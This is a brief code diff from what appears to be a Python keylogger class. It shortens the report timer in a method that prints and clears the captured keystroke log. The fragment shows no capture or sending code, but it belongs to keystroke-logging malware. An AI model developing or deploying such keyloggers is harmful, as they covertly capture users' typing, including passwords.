@@ -19,7 +19,7 @@ class Keylogger:
         global log
         print(log)
         log = ""
-        timer = threading.Timer(300, self.report)
+        timer = threading.Timer(5, self.report)
         timer.start()
 
     def start(self):
